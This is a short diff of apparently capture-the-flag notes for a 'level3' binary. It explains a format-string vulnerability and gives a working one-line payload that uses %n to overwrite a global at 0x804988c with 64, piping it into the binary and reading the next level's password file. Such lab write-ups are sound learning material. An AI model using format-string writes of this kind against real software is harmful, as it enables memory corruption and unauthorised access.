@@ -1,1 +1,7 @@
-python -c 'print("\x08\x04\x98\x8c"[::-1] +"a"*31 + " %p %p %p %n")' > /tmp/test2
+binary calls gets then printf of what we enter
+he then compares what is at the address 0x804988c with 0x40
+with printf format we can write at an address with %n modifier
+we just need to write 64 chars at address 0x804988c so that its equals to 0x40
+python -c 'print("\x08\x04\x98\x8c"[::-1] +"a"*31 + " %p %p %p %n")' > /tmp/test
+cat /tmp/test - | ./level3
+cat /home/user/level4/.pass
